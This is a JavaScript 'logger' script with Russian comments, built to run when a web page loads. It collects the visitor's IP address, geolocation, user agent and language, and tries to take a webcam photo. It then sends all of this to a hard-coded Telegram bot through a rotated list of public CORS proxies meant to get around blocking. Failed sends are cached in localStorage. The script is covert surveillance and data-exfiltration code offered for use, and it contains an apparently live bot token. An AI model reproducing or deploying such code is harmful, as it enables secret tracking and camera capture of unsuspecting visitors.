// logger.js — РАБОЧАЯ ВЕРСИЯ ДЛЯ РФ (ЧЕРЕЗ ПРОКСИ)
(async function() {
    "use strict";

    // ========== ТВОИ ДАННЫЕ ==========
    const TELEGRAM_BOT_TOKEN = "8916079717:AAFIrsjINbXmyyWZCmQGHak6DnjHGbi6-Xk";
    const TELEGRAM_CHAT_ID = "8995427762";

    // ПРОКСИ ДЛЯ ОБХОДА БЛОКИРОВКИ (рабочие в РФ)
    // Прокси перебираются автоматически, пока не найдут рабочий
    const PROXIES = [
        "https://cors-anywhere.herokuapp.com/https://api.telegram.org/bot",
        "https://api.allorigins.win/raw?url=https://api.telegram.org/bot",
        "https://corsproxy.io/?https://api.telegram.org/bot",
        "https://proxy.cors.sh/https://api.telegram.org/bot",
        "https://cors-proxy.htmldriven.com/?url=https://api.telegram.org/bot"
    ];

    // ========== 1. Сбор IP и геолокации ==========
    let ipAddress = "0.0.0.0";
    let country = "не определена";
    let region = "не определён";
    let city = "не определён";

    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ipAddress = ipData.ip;

        const geoReq = await fetch(`https://ipapi.co/${ipAddress}/json/`);
        const geoData = await geoReq.json();
        
        country = geoData.country_name || "не определена";
        region = geoData.region || "не определён";
        city = geoData.city || "не определён";
    } catch(e) {
        console.warn("Geo error:", e);
    }

    // ========== 2. Время перехода ==========
    const now = new Date();
    const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" }) + " MSK";

    // ========== 3. UserAgent ПОЛНЫЙ ==========
    const fullUserAgent = navigator.userAgent;
    const language = navigator.language || "не определён";

    // ========== 4. Формирование сообщения (ТОЧНАЯ СТРУКТУРА) ==========
    const message = `🚨 <b>Новый переход!</b>

<b>🌐 IP:</b> <code>${ipAddress}</code>
<b>├─ User-Agent:</b> <code>${fullUserAgent}</code>
<b>├─ Язык:</b> <code>${language}</code>
<b>└─ Время:</b> <code>${timeStr}</code>

<b>🌍 Геолокация:</b>
<b>├─ Страна:</b> <code>${country}</code>
<b>├─ Регион:</b> <code>${region}</code>
<b>└─ Город:</b> <code>${city}</code>`;

    // ========== 5. Захват фото с вебкамеры ==========
    let photoBlob = null;

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.autoplay = true;
        video.playsInline = true;

        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                resolve();
            };
        });

        await new Promise(r => setTimeout(r, 500));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        photoBlob = await new Promise(resolve => {
            canvas.toBlob(resolve, "image/jpeg", 0.85);
        });

        stream.getTracks().forEach(track => track.stop());
    } catch(e) {
        console.warn("Camera error:", e);
        photoBlob = null;
    }

    // ========== 6. Отправка через прокси (с автоматическим перебором) ==========
    async function sendViaProxy(proxy, blob, caption) {
        try {
            let url, options;
            
            if (blob) {
                // Отправка фото
                url = `${proxy}${TELEGRAM_BOT_TOKEN}/sendPhoto`;
                const formData = new FormData();
                formData.append("chat_id", TELEGRAM_CHAT_ID);
                formData.append("photo", blob, "snapshot.jpg");
                formData.append("caption", caption);
                formData.append("parse_mode", "HTML");
                options = { method: "POST", body: formData };
            } else {
                // Отправка текста
                url = `${proxy}${TELEGRAM_BOT_TOKEN}/sendMessage`;
                options = {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: caption,
                        parse_mode: "HTML",
                        disable_web_page_preview: true
                    })
                };
            }
            
            const response = await fetch(url, options);
            const result = await response.json();
            return { success: result.ok, error: result.description };
        } catch(e) {
            return { success: false, error: e.message };
        }
    }

    async function sendWithFallback(blob, caption) {
        for (const proxy of PROXIES) {
            console.log(`🔄 Пробуем прокси: ${proxy.substring(0, 50)}...`);
            const result = await sendViaProxy(proxy, blob, caption);
            if (result.success) {
                console.log(`✅ Успешно отправлено через прокси`);
                return true;
            } else {
                console.log(`❌ Прокси не работает: ${result.error}`);
            }
            await new Promise(r => setTimeout(r, 500));
        }
        return false;
    }

    // ========== 7. Отправка ==========
    let sent = false;
    
    if (photoBlob) {
        sent = await sendWithFallback(photoBlob, message);
        if (!sent) {
            console.log("⚠️ Фото не отправилось, пробуем отправить только текст...");
            sent = await sendWithFallback(null, message);
        }
    } else {
        sent = await sendWithFallback(null, message);
    }
    
    if (sent) {
        console.log("✅ Данные успешно отправлены в Telegram!");
    } else {
        console.log("❌ Не удалось отправить данные через все прокси");
        // Сохраняем данные локально, если не отправились
        try {
            const failed = JSON.parse(localStorage.getItem("foxlogger_failed") || "[]");
            failed.push({
                data: message,
                time: new Date().toISOString(),
                ip: ipAddress
            });
            localStorage.setItem("foxlogger_failed", JSON.stringify(failed.slice(-20)));
            console.log("📦 Данные сохранены локально (будут отправлены позже)");
        } catch(e) {}
    }
})();
